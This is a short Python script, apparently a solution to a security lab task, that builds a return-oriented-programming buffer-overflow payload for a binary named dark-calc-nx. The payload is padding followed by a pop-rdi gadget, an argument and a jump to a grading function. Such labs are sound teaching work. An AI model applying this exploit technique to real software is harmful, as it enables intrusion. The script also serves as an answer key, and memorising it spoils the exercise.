#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""
'''
import sys

payload = b""

sys.stdout.buffer.write(payload)
'''

#!/usr/bin/env python3
import struct
import sys

def qword(value):
    return struct.pack("<Q", value)

POP_RDI = 0x401a33
RET = 0x401a34
GRADE_EVAL = 0x401978

payload = (
    b"A" * 24
    + qword(POP_RDI)
    + qword(4)           
    + qword(RET)         
    + qword(GRADE_EVAL)
)

sys.stdout.buffer.write(payload)